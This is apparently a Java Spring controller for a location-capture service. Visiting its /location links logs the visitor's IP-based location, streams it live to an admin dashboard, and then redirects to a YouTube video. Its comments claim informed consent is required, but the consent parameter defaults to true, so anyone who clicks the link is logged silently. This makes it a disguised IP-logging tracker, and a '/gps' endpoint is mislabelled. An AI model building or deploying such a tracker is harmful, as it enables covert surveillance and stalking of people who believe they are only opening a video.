package com.secure.hms.controller;

import java.net.URI;
import java.util.HashMap;
import java.util.Map;

import com.secure.hms.service.LocationService;

import jakarta.servlet.http.HttpServletRequest;

import org.springframework.http.HttpHeaders;
import org.springframework.http.HttpStatus;
import org.springframework.http.MediaType;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.servlet.mvc.method.annotation.SseEmitter;

@RestController
public class LocationController {

    private static final String YOUTUBE_URL =
            "https://www.youtube.com/watch?v=Ae66MhGBDTA"
            + "&list=RDAe66MhGBDTA&start_radio=1";

    private final LocationService locationService;

    public LocationController(LocationService locationService) {
        this.locationService = locationService;
    }

    /*
     * IP-based location, then redirect.
     * Use only after informing the user and obtaining consent.
     */
    @GetMapping("/location")
    public ResponseEntity<?> captureLocation(
            @RequestParam(required = false) String userId,
            @RequestParam(defaultValue = "true") boolean consent,
            HttpServletRequest request) {

        return captureIpLocation(userId, consent, request);
    }

    /*
     * No HTML page: this endpoint also uses IP-based location only.
     * It cannot obtain GPS coordinates by itself.
     */
    @GetMapping("/location/gps")
    public ResponseEntity<?> captureGpsLocation(
            @RequestParam(required = false) String userId,
            @RequestParam(defaultValue = "true") boolean consent,
            HttpServletRequest request) {

        return captureIpLocation(userId, consent, request);
    }

    private ResponseEntity<?> captureIpLocation(
            String userId,
            boolean consent,
            HttpServletRequest request) {

        if (!consent) {
            return ResponseEntity.status(HttpStatus.FORBIDDEN)
                    .contentType(MediaType.TEXT_PLAIN)
                    .body("Location reporting requires informed consent.");
        }

        Map<String, Object> body = new HashMap<>();
        body.put("userId", userId);
        body.put("gpsAvailable", false);

        locationService.processLocation(body, getClientIp(request));

        return ResponseEntity.status(HttpStatus.FOUND)
                .location(URI.create(YOUTUBE_URL))
                .build();
    }

    /*
     * Receives coordinates from a browser that has obtained
     * the user's GPS permission.
     */
    @PostMapping(
            value = "/api/location/report",
            consumes = MediaType.APPLICATION_JSON_VALUE,
            produces = MediaType.APPLICATION_JSON_VALUE
    )
    public ResponseEntity<?> reportLocation(
            @RequestBody Map<String, Object> body,
            HttpServletRequest request) {

        if (!Boolean.TRUE.equals(body.get("consent"))) {
            return ResponseEntity.status(HttpStatus.FORBIDDEN)
                    .body(Map.of(
                            "error",
                            "Location reporting requires informed consent."
                    ));
        }

        String result = locationService.processLocation(
                body,
                getClientIp(request)
        );

        return ResponseEntity.ok()
                .contentType(MediaType.APPLICATION_JSON)
                .body(result);
    }

    /*
     * Live location-report stream for the admin dashboard.
     */
    @GetMapping(
            value = "/api/location/stream",
            produces = MediaType.TEXT_EVENT_STREAM_VALUE
    )
    public SseEmitter streamLocations() {
        return locationService.subscribe();
    }

    /*
     * Use the forwarded client IP header only when your deployment
     * proxy is configured to set/overwrite it safely.
     */
    private String getClientIp(HttpServletRequest request) {
        String forwardedFor = request.getHeader("X-Forwarded-For");

        if (forwardedFor != null && !forwardedFor.isBlank()) {
            return forwardedFor.split(",")[0].trim();
        }

        return request.getRemoteAddr();
    }
}